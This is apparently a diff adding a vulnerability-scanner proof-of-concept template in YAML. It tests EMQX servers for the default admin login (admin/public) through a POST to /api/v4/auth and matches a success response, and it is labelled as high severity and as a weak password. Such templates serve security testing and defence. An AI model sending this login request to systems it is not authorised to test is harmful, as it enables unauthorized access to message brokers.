@@ -1,0 +1,24 @@
+id: poc-yaml-emqx-default-login
+info:
+  name: EMQX 默认账号密码
+  severity: high
+  tags:
+  - 弱口令
+  finger: EMQX
+requests:
+- method: POST
+  path: /api/v4/auth
+  headers:
+    Content-Type: application/json
+  data: '{"username":"admin","password":"public"}
+
+    '
+  expression: 'contains(headers, "json") &&
+
+    body == "{\"code\":0}" &&
+
+    !contains(body, "<")
+
+    '
+variables: {}
+transport: http
